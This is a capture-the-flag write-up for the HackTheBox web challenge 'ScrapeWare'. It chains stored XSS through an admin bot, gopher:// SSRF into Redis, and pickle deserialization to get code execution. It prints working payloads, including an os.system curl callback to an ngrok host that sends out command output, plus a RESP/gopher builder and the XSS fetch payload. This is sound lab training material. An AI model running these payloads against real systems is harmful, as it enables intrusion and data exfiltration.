# ScrapeWare

**Category:** Web | **Difficulty:** Hard | **Flag:** `HTB{qu3u3d_my_w4y_1nt0_rc3}`

---

## What We're Dealing With

Flask app running on Werkzeug 2.2.2. Public-facing "Get a Quote" form, a protected admin panel, a Redis job queue, and a background worker. Source is provided.

```bash
nmap -sV -sC -p 30306 154.57.164.72
```
```
30306/tcp open  http  Werkzeug httpd 2.2.2 (Python 3.8.14)
```

The key files to look at first:

```
application/templates/requests.html   ← XSS
application/bot.py                    ← admin bot
application/cache.py                  ← pickle
worker/main.py                        ← pickle
worker/scrape.py                      ← SSRF
```

---

## Reading the Code

**`routes.py`** — every time someone submits a quote, the app stores it and immediately calls `view_requests()`, which spins up a headless Chrome session logged in as admin and browses to `/admin/quote-requests`. The bot hangs out for 5 seconds then quits.

```python
db.session.add(quote_request)
db.session.commit()
view_requests()   # bot logs in and views the dashboard
clear_requests()  # wipes all requests
return response('Request received successfully!')
```

The response doesn't come back until the bot is done — so that blocking `200 OK` confirms the bot ran.

**`requests.html`** — the admin dashboard renders the quote message with `| safe`:

```html
<p class="card-text">Request Message : {{ request.quote_message | safe }}</p>
```

`| safe` tells Jinja2 to skip HTML escaping entirely. Drop a `<script>` in `quote_message` and it executes in the admin's browser. Since the bot is the only one viewing this page, our XSS runs in an authenticated admin session.

**`worker/scrape.py`** — the worker fetches job URLs using pycurl:

```python
c = pycurl.Curl()
c.setopt(c.URL, url)
c.setopt(c.FOLLOWLOCATION, True)
resp = c.perform_rb()
```

No protocol restriction. pycurl is built on libcurl which supports `gopher://` out of the box. Gopher lets us send raw bytes to any TCP socket — including Redis on `127.0.0.1:6379`.

**`worker/main.py` + `cache.py`** — job data is stored in Redis as `base64(pickle.dumps(data))` and deserialized with `pickle.loads()` on the other end, no validation:

```python
# storing a job
current_app.redis.hset('jobs', job_id, base64.b64encode(pickle.dumps(data)))

# the worker reading it back
data = store.hget('jobs', job_id)
job  = pickle.loads(base64.b64decode(data))   # ← RCE if we control this
```

If we can write anything we want into the `jobs` hash in Redis, the worker deserializes it and we get code execution.

---

## The Plan

Chain the four bugs together:

```
1. POST a quote with a <script> in quote_message
         │
         ▼
2. Bot logs in as admin, visits /admin/quote-requests, XSS fires
   Our script calls fetch('/api/admin/scrape/create') using the bot's session
   The job URL we pass is a gopher:// payload targeting Redis
         │
         ▼
3. Worker picks up the scrape job, pycurl fetches the gopher URL
   Raw TCP bytes hit Redis → HSET jobs 31337 <malicious_pickle>
                           → RPUSH jobqueue 31337
         │
         ▼
4. Worker picks up job 31337, calls pickle.loads() on our payload
   → os.system('/readflag | curl https://ngrok-url?b=$(base64 -w0)')
         │
         ▼
5. Flag lands in our ngrok listener
```

**Timing:** ~10s for the bot, then two 10s worker cycles = flag in ~30s total.

---

## Step 1 — Start the Listener

The worker runs as `www-data` and can't write to anywhere web-accessible, so we need an outbound callback. Run these in two terminals.

**Terminal 1 — local HTTP listener that auto-decodes the flag:**

```bash
python3 -c "
import http.server, socketserver, base64

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('CALLBACK:', self.path, flush=True)
        if '?b=' in self.path:
            b64  = self.path.split('?b=')[1]
            flag = base64.b64decode(b64 + '==').decode().strip()
            print('FLAG:', flag, flush=True)
        self.send_response(200)
        self.end_headers()
    def log_message(self, *a): pass

print('Listening on port 9997...')
socketserver.TCPServer(('0.0.0.0', 9997), H).serve_forever()
"
```

**Terminal 2 — expose it publicly:**

```bash
ngrok http 9997
```

Copy the `https://xxxx.ngrok-free.app` URL. That's your `CALLBACK_URL`.

---

## Step 2 — Build the Pickle Payload

Open a Python shell. This payload executes `/readflag` when deserialized and curls the result to us. We base64 the flag output so the `{` and `}` characters don't get eaten by the URL.

```python
import pickle, os, base64

CALLBACK_URL = "https://xxxx.ngrok-free.app"   # ← your ngrok URL

class RCE:
    def __reduce__(self):
        cmd = f'curl -sk "{CALLBACK_URL}?b=$(/readflag | base64 -w0)"'
        return (os.system, (cmd,))

pickle_payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(pickle_payload)
```

`__reduce__` tells pickle how to reconstruct an object. Returning `(os.system, (cmd,))` means pickle calls `os.system(cmd)` the moment `pickle.loads()` runs.

---

## Step 3 — Build the Redis RESP Commands

Redis speaks RESP (REdis Serialization Protocol). We need two commands:
- `HSET jobs 31337 <pickle>` — write our payload into the jobs hash
- `RPUSH jobqueue 31337` — queue it so the worker picks it up

RESP format: `*<nargs>\r\n` followed by `$<len>\r\n<arg>\r\n` for each arg.

```python
from urllib.parse import quote

JOB_ID = "31337"

def resp_cmd(*args):
    out = f"*{len(args)}\r\n"
    for arg in args:
        arg = str(arg)
        out += f"${len(arg)}\r\n{arg}\r\n"
    return out

redis_payload = (
    resp_cmd("HSET", "jobs", JOB_ID, pickle_payload) +
    resp_cmd("RPUSH", "jobqueue", JOB_ID)
)
```

---

## Step 4 — Wrap in a Gopher URL

Gopher sends raw bytes directly to a TCP socket. Format: `gopher://host:port/_<url-encoded-data>`. The leading `_` is the selector byte — Redis ignores it and processes everything after.

```python
gopher_url = f"gopher://127.0.0.1:6379/_{quote(redis_payload, safe='')}"
print(gopher_url[:80], "...")
```

When pycurl fetches this, libcurl opens a raw TCP connection to Redis and writes our two commands straight into the socket.

---

## Step 5 — Wrap in the XSS Payload

The XSS runs inside the bot's authenticated Chrome session, so `fetch()` goes out with valid admin cookies. We call the scrape creation endpoint and pass our gopher URL as the job URL.

```python
xss_payload = (
    f"<script>fetch('/api/admin/scrape/create',{{"
    f"method:'POST',"
    f"headers:{{'Content-Type':'application/json'}},"
    f"body:JSON.stringify({{job_title:'x',urls:['{gopher_url}']}})"
    f"}})</script>"
)
print(f"XSS length: {len(xss_payload)}")
print(xss_payload)
```

The schema says `db.Column(db.String(500))` but SQLite doesn't enforce string lengths, so don't worry if the payload runs long.

---

## Step 6 — Fire It

```python
import requests

resp = requests.post(
    "http://154.57.164.72:30306/api/request-quote",
    json={
        "name":          "attacker",
        "email_address": "pwn@pwn.com",
        "company_name":  "pwn",
        "company_size":  "1",
        "quote_message": xss_payload,
    }
)
print(resp.json())
# {'message': 'Request received successfully!'}
```

The call blocks for ~10 seconds while the bot runs. Once you get the response, the gopher scrape job has already been created. Wait ~30 more seconds for the worker to cycle twice.

---

## Step 7 — Catch the Flag

Watch **Terminal 1**. You'll see:

```
CALLBACK: /?b=SFRCe3F1M3UzZF9teV93NHlfMW50MF9yYzN9
FLAG: HTB{qu3u3d_my_w4y_1nt0_rc3}
```

If you need to decode manually:

```bash
echo "SFRCe3F1M3UzZF9teV93NHlfMW50MF9yYzN9" | base64 -d
```

---

## Option 2 — Just Run the Script

Everything above is automated in `exploit.py`. It starts the listener, launches ngrok, builds and fires the chain, and prints the flag — one command, no setup.

```bash
python3 exploit.py
# custom target:
python3 exploit.py http://154.57.164.72:30306
```

```
[+] Local HTTP listener started on port 9997
[*] Starting ngrok tunnel...
[+] ngrok tunnel ready: https://f76a-191-96-227-41.ngrok-free.app

[*] Building exploit chain...
    Pickle payload : 148 bytes
    Gopher URL     : 344 chars
    XSS payload    : 501 chars

[*] Submitting poisoned quote...
[+] Server response: Request received successfully!

[*] Waiting for worker cycles...
    still waiting... (38s remaining)

==================================================
  FLAG: HTB{qu3u3d_my_w4y_1nt0_rc3}
==================================================
```
